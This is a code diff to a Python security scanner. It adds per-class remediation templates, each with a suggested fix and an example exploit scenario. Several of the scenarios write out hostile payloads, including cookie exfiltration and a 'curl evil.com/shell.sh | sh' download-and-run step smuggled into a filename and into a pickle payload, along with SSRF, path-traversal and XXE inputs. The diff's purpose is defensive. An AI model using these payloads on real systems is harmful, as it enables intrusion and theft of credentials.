@@ -83,6 +83,371 @@ _MAX_PARALLELISM = _read_parallelism_env()
 _KEEP_CONFIDENCES: frozenset[str] = _read_keep_confidences_env()
 _ADVISORY_CONFIDENCES: frozenset[str] = _read_advisory_confidences_env()
 
+# ---------------------------------------------------------------------------
+# Class-specific fallback remediation templates.
+# Applied in candidate_to_finding() when the candidate has no LLM-generated
+# suggested_fix or exploit_scenario (scanner-only candidates always arrive with
+# empty fields). The fallback is always more useful than the generic string.
+# ---------------------------------------------------------------------------
+_REMEDIATION_TEMPLATES: dict[str, dict[str, str]] = {
+    "sqli": {
+        "suggested_fix": (
+            "Use parameterised queries instead of string formatting:\n\n"
+            "```python\n"
+            "# Before (vulnerable):\n"
+            "cursor.execute(\"SELECT * FROM users WHERE id = '%s'\" % user_id)\n\n"
+            "# After (safe):\n"
+            "cursor.execute(\"SELECT * FROM users WHERE id = %s\", (user_id,))\n"
+            "```\n\n"
+            "For async drivers: `await cursor.execute(\"... WHERE id = %s\", (value,))`"
+        ),
+        "exploit_scenario": (
+            "An attacker supplies `' OR '1'='1` as the user-controlled parameter. "
+            "The query becomes `SELECT * FROM users WHERE id = '' OR '1'='1'`, "
+            "returning all rows and bypassing authentication."
+        ),
+    },
+    "xss": {
+        "suggested_fix": (
+            "Escape all user-controlled output before inserting into HTML:\n\n"
+            "```javascript\n"
+            "// Before (vulnerable):\n"
+            "element.innerHTML = userInput;\n\n"
+            "// After (safe):\n"
+            "element.textContent = userInput;\n"
+            "// Or for rich content: element.innerHTML = DOMPurify.sanitize(userInput);\n"
+            "```\n\n"
+            "For server-side templates: ensure autoescaping is enabled (Jinja2: "
+            "`autoescape=True`; Django templates escape by default)."
+        ),
+        "exploit_scenario": (
+            "An attacker submits "
+            "`<script>document.location='https://evil.com?c='+document.cookie</script>`. "
+            "The unescaped value is rendered in the page, executing in the victim's browser "
+            "and exfiltrating session cookies."
+        ),
+    },
+    "command_injection": {
+        "suggested_fix": (
+            "Never pass user input to a shell command. Use argument lists with `shell=False`:\n\n"
+            "```python\n"
+            "# Before (vulnerable):\n"
+            "subprocess.run(f\"convert {filename} output.png\", shell=True)\n\n"
+            "# After (safe):\n"
+            "subprocess.run([\"convert\", filename, \"output.png\"], shell=False)\n"
+            "```\n\n"
+            "Validate and allowlist input before use; never trust user-supplied filenames directly."
+        ),
+        "exploit_scenario": (
+            "An attacker sets the filename to `file.jpg; curl https://evil.com/shell.sh | sh`. "
+            "With `shell=True`, the shell interprets the semicolon as a command separator "
+            "and executes the attacker's payload with the application's privileges."
+        ),
+    },
+    "ssrf": {
+        "suggested_fix": (
+            "Validate the URL against an explicit allowlist before making the request:\n\n"
+            "```python\n"
+            "# Before (vulnerable):\n"
+            "response = requests.get(user_supplied_url)\n\n"
+            "# After (safe):\n"
+            "from urllib.parse import urlparse\n"
+            "ALLOWED_HOSTS = {\"api.example.com\", \"cdn.example.com\"}\n"
+            "parsed = urlparse(user_supplied_url)\n"
+            "if parsed.hostname not in ALLOWED_HOSTS:\n"
+            "    raise ValueError(\"URL not allowed\")\n"
+            "response = requests.get(user_supplied_url)\n"
+            "```\n\n"
+            "Also block redirects (`allow_redirects=False`) and use a DNS allowlist."
+        ),
+        "exploit_scenario": (
+            "An attacker passes `http://169.254.169.254/latest/meta-data/iam/security-credentials/` "
+            "as the URL. The server-side request reaches the AWS metadata endpoint and returns "
+            "IAM credentials, which the attacker uses to escalate privileges in AWS."
+        ),
+    },
+    "path_traversal": {
+        "suggested_fix": (
+            "Resolve the path and verify it stays within the allowed base directory:\n\n"
+            "```python\n"
+            "# Before (vulnerable):\n"
+            "path = os.path.join(BASE_DIR, user_filename)\n"
+            "with open(path) as f: ...\n\n"
+            "# After (safe):\n"
+            "import pathlib\n"
+            "base = pathlib.Path(BASE_DIR).resolve()\n"
+            "target = (base / user_filename).resolve()\n"
+            "if not str(target).startswith(str(base)):\n"
+            "    raise PermissionError(\"Path outside allowed directory\")\n"
+            "with open(target) as f: ...\n"
+            "```"
+        ),
+        "exploit_scenario": (
+            "An attacker supplies `../../etc/passwd` as the filename. The join produces "
+            "`/app/files/../../etc/passwd` which resolves to `/etc/passwd`, exposing system "
+            "user accounts. Secrets files (`.env`, private keys) are equally reachable."
+        ),
+    },
+    "csrf": {
+        "suggested_fix": (
+            "Use your framework's built-in CSRF protection for all state-changing endpoints:\n\n"
+            "```python\n"
+            "# Flask-WTF:\n"
+            "from flask_wtf.csrf import CSRFProtect\n"
+            "csrf = CSRFProtect(app)  # protects all POST/PUT/DELETE by default\n\n"
+            "# Or verify the CSRF token manually:\n"
+            "token = session.get('csrf_token')\n"
+            "if not token or token != request.form.get('csrf_token'):\n"
+            "    abort(403)\n"
+            "```\n\n"
+            "Include the token in every form using a hidden field or a custom request header for AJAX."
+        ),
+        "exploit_scenario": (
+            "An attacker hosts a page with a hidden form that auto-submits a state-changing request "
+            "(e.g., password change or funds transfer) to the target site. Because the victim is "
+            "already authenticated, the browser includes their session cookie and the request "
+            "succeeds without their knowledge."
+        ),
+    },
+    "weak_crypto": {
+        "suggested_fix": (
+            "Replace broken algorithms with strong, modern alternatives:\n\n"
+            "```python\n"
+            "# Before (vulnerable — MD5/SHA-1 for security purposes):\n"
+            "import hashlib\n"
+            "digest = hashlib.md5(password.encode()).hexdigest()\n\n"
+            "# After (safe — bcrypt for passwords, SHA-256 for HMAC/integrity):\n"
+            "import bcrypt\n"
+            "hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt())\n"
+            "```\n\n"
+            "Never use MD5 or SHA-1 for passwords, MACs, signatures, or security tokens. "
+            "Use bcrypt/argon2 for passwords, SHA-256/SHA-3 for integrity, AES-GCM for encryption."
+        ),
+        "exploit_scenario": (
+            "An attacker obtains the MD5 hash from a database dump. Using a precomputed rainbow "
+            "table or a modern GPU cracker, they recover the plaintext password in minutes. "
+            "No direct access to the system is required — the hash alone is sufficient."
+        ),
+    },
+    "weak_hash": {
+        "suggested_fix": (
+            "Replace MD5/SHA-1 with a strong algorithm appropriate for the use case:\n\n"
+            "```python\n"
+            "# Before (vulnerable):\n"
+            "import hashlib\n"
+            "digest = hashlib.sha1(data).hexdigest()\n\n"
+            "# After (safe — SHA-256 for integrity, bcrypt for passwords):\n"
+            "digest = hashlib.sha256(data).hexdigest()\n"
+            "```"
+        ),
+        "exploit_scenario": (
+            "An attacker obtains stored SHA-1 hashes. Using a GPU and rainbow tables they crack "
+            "common passwords in minutes, gaining access to user accounts without brute force."
+        ),
+    },
+    "insecure_hash": {
+        "suggested_fix": (
+            "Replace the insecure hash with SHA-256 or stronger for non-password use, "
+            "or bcrypt/argon2 for password hashing:\n\n"
+            "```python\n"
+            "import hashlib\n"
+            "digest = hashlib.sha256(data).hexdigest()\n"
+            "```"
+        ),
+        "exploit_scenario": (
+            "An attacker with a copy of the hash database uses GPU acceleration to crack "
+            "weakly-hashed credentials in minutes, enabling account takeover at scale."
+        ),
+    },
+    "deserialization": {
+        "suggested_fix": (
+            "Never deserialize untrusted data with `pickle`, `marshal`, or `yaml.load`:\n\n"
+            "```python\n"
+            "# Before (vulnerable):\n"
+            "obj = pickle.loads(user_data)\n\n"
+            "# After (safe — use JSON or define a strict schema):\n"
+            "import json\n"
+            "obj = json.loads(user_data)  # JSON only allows data, not code\n"
+            "```\n\n"
+            "For YAML: always use `yaml.safe_load()` instead of `yaml.load()`. "
+            "If you must deserialize binary formats, use a signed + encrypted envelope "
+            "and reject any payload that fails signature verification."
+        ),
+        "exploit_scenario": (
+            "An attacker crafts a pickle payload that, on deserialization, executes "
+            "`os.system('curl https://evil.com/shell.sh | sh')`. The payload is submitted "
+            "as the session cookie or API body. On deserialization the server executes "
+            "arbitrary OS commands with the application's privileges."
+        ),
+    },
+    "code_injection": {
+        "suggested_fix": (
+            "Remove `eval()` and `exec()` calls; replace with safe alternatives:\n\n"
+            "```python\n"
+            "# Before (vulnerable):\n"
+            "result = eval(user_expression)\n\n"
+            "# After (safe — use ast.literal_eval for data, or a sandboxed evaluator):\n"
+            "import ast\n"
+            "result = ast.literal_eval(user_expression)  # Only parses literals, not expressions\n"
+            "```\n\n"
+            "For math expressions: use a dedicated safe library (e.g., simpleeval). "
+            "For dynamic dispatch: use a lookup table `{'add': add_fn}[user_choice]()` instead."
+        ),
+        "exploit_scenario": (
+            "An attacker submits `__import__('os').system('id')` as the expression. "
+            "`eval()` executes this as Python code with the server's full privileges, "
+            "allowing arbitrary OS command execution."
+        ),
+    },
+    "auth_bypass": {
+        "suggested_fix": (
+            "Add ownership/permission checks before returning or modifying any resource:\n\n"
+            "```python\n"
+            "# Before (vulnerable — no ownership check):\n"
+            "record = db.get(record_id)\n"
+            "return record\n\n"
+            "# After (safe):\n"
+            "record = db.get(record_id)\n"
+            "if record.owner_id != current_user.id:\n"
+            "    raise PermissionError(403)\n"
+            "return record\n"
+            "```\n\n"
+            "Implement checks at the service layer, not just the route layer. "
+            "Use parameterised queries that filter by owner: `WHERE id = ? AND user_id = ?`."
+        ),
+        "exploit_scenario": (
+            "An authenticated attacker increments the numeric `record_id` in the request. "
+            "The endpoint fetches the record belonging to another user and returns it without "
+            "verifying ownership, exposing private data (IDOR — Insecure Direct Object Reference)."
+        ),
+    },
+    "idor": {
+        "suggested_fix": (
+            "Enforce ownership checks — never trust a client-supplied identifier alone:\n\n"
+            "```python\n"
+            "# Before (vulnerable):\n"
+            "obj = db.query(Item).filter_by(id=item_id).first()\n\n"
+            "# After (safe):\n"
+            "obj = db.query(Item).filter_by(id=item_id, owner_id=current_user.id).first()\n"
+            "if not obj:\n"
+            "    raise HTTPException(status_code=403)\n"
+            "```"
+        ),
+        "exploit_scenario": (
+            "An attacker changes the `item_id` parameter in the request to another user's ID. "
+            "Without an ownership filter the query returns the other user's record, "
+            "exposing or allowing modification of data they do not own."
+        ),
+    },
+    "unsafe_file_upload": {
+        "suggested_fix": (
+            "Validate file type by magic bytes, not extension or Content-Type. Store outside webroot:\n\n"
+            "```python\n"
+            "import magic  # python-magic\n"
+            "ALLOWED_MIME = {'image/jpeg', 'image/png', 'application/pdf'}\n"
+            "data = file.read()\n"
+            "mime = magic.from_buffer(data, mime=True)\n"
+            "if mime not in ALLOWED_MIME:\n"
+            "    raise ValueError('File type not allowed')\n"
+            "# Use a server-generated name, never the user-supplied filename:\n"
+            "import uuid\n"
+            "safe_name = str(uuid.uuid4()) + EXTENSIONS[mime]\n"
+            "store_outside_webroot(safe_name, data)\n"
+            "```"
+        ),
+        "exploit_scenario": (
+            "An attacker renames a PHP web shell to `shell.jpg` and uploads it. If stored inside "
+            "the webroot and served as-is, the server executes the PHP code when the file is "
+            "requested, giving the attacker a remote shell."
+        ),
+    },
+    "xxe": {
+        "suggested_fix": (
+            "Disable external entity resolution in your XML parser:\n\n"
+            "```python\n"
+            "from lxml import etree\n"
+            "parser = etree.XMLParser(resolve_entities=False, no_network=True)\n"
+            "tree = etree.parse(xml_input, parser)\n"
+            "```\n\n"
+            "Or use `defusedxml` which disables dangerous features by default."
+        ),
+        "exploit_scenario": (
+            "An attacker injects `<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>` "
+            "into the XML body. The parser resolves the entity and returns the file contents "
+            "in the application response."
+        ),
+    },
+    "open_redirect": {
+        "suggested_fix": (
+            "Validate the redirect destination against a strict allowlist:\n\n"
+            "```python\n"
+            "ALLOWED_REDIRECT_HOSTS = {'example.com', 'www.example.com'}\n"
+            "from urllib.parse import urlparse\n"
+            "parsed = urlparse(next_url)\n"
+            "if parsed.netloc and parsed.netloc not in ALLOWED_REDIRECT_HOSTS:\n"
+            "    next_url = '/'\n"
+            "return redirect(next_url)\n"
+            "```"
+        ),
+        "exploit_scenario": (
+            "An attacker sends a victim a link to `/redirect?next=https://evil.com/phish`. "
+            "The victim trusts the legitimate domain, clicks the link, and is silently "
+            "forwarded to the phishing page that harvests their credentials."
+        ),
+    },
+    "ldap_injection": {
+        "suggested_fix": (
+            "Escape all user-controlled values before embedding them in LDAP filters:\n\n"
+            "```python\n"
+            "# python-ldap:\n"
+            "import ldap.filter\n"
+            "safe_user = ldap.filter.escape_filter_chars(user_input)\n"
+            "search_filter = f'(uid={safe_user})'\n"
+            "```\n\n"
+            "Alternatively, use an LDAP library that parameterises filters natively."
+        ),
+        "exploit_scenario": (
+            "An attacker injects `*)(uid=*))(|(uid=*` into the username field. "
+            "The filter becomes `(&(uid=*)(uid=*))(|(uid=*)(password=...))` which matches "
+            "any user, bypassing authentication entirely."
+        ),
+    },
+    "nosqli": {
+        "suggested_fix": (
+            "Reject non-scalar values and strip MongoDB operator keys from user input:\n\n"
+            "```python\n"
+            "# Before (vulnerable):\n"
+            "user = collection.find_one({'username': request.json['username']})\n\n"
+            "# After (safe — force scalar):\n"
+            "username = str(request.json.get('username', ''))\n"
+            "user = collection.find_one({'username': username})\n"
+            "```\n\n"
+            "Never pass raw JSON objects from the request body directly into a query document."
+        ),
+        "exploit_scenario": (
+            "An attacker sends `{'username': {'$ne': null}}` in the JSON body. "
+            "MongoDB evaluates the `$ne` operator and returns the first user in the collection, "
+            "bypassing the login check without knowing any credentials."
+        ),
+    },
+    "unsafe_yaml": {
+        "suggested_fix": (
+            "Always use `yaml.safe_load()` instead of `yaml.load()`:\n\n"
+            "```python\n"
+            "# Before (vulnerable):\n"
+            "data = yaml.load(user_input)\n\n"
+            "# After (safe):\n"
+            "data = yaml.safe_load(user_input)  # Restricts to basic YAML types only\n"
+            "```"
+        ),
+        "exploit_scenario": (
+            "An attacker supplies `!!python/object/apply:os.system ['id']` as the YAML value. "
+            "`yaml.load()` deserializes this as a Python object, executing the OS command "
+            "with the server's privileges."
+        ),
+    },
+}
+
 
 def _is_high_risk_path(filepath: str) -> bool:
     """Delegate to the context packager's path check."""
@@ -515,6 +880,7 @@ def candidate_to_finding(
     if bundle is not None and bundle.upload_context is not None:
         context_summary = bundle.upload_context.overall_summary or ""
 
+    _tmpl = _REMEDIATION_TEMPLATES.get(candidate.vuln_class or "", {})
     return VulnerabilityFinding(
         vulnerability_id=vuln_id,
         severity=severity,
@@ -526,13 +892,17 @@ def candidate_to_finding(
             candidate.description or candidate.scanner_message or f"{candidate.vuln_class} detected"
         ),
         suggested_fix=(
-            candidate.suggested_fix or "Review and remediate the identified vulnerability."
+            candidate.suggested_fix
+            or _tmpl.get("suggested_fix", "Review and remediate the identified vulnerability.")
         ),
         owasp_reference=candidate.owasp_reference or "",
         patch_file_path="",
         exploit_scenario=(
             candidate.exploit_scenario
-            or f"Attacker exploits {candidate.vuln_class} in {candidate.file}."
+            or _tmpl.get(
+                "exploit_scenario",
+                f"Attacker exploits {candidate.vuln_class} in {candidate.file}.",
+            )
         ),
         verification_status=verification_status,
         sources=candidate.sources,
@@ -585,7 +955,10 @@ def verify_vuln_candidates(
         return []
 
     effective_keep = keep_confidences if keep_confidences is not None else _KEEP_CONFIDENCES
-    indices = list(range(len(candidates)))
+    # Sort by vuln_class so consecutive candidates share the same class,
+    # maximising the chance that each 5-item batch is homogeneous and therefore
+    # receives a class-specific rubric instead of the generic prompt.
+    indices = sorted(range(len(candidates)), key=lambda i: candidates[i].vuln_class or "")
     batches: list[list[int]] = list(_chunk(indices, _BATCH_SIZE))
     workers = min(parallelism or _MAX_PARALLELISM, len(batches))
 
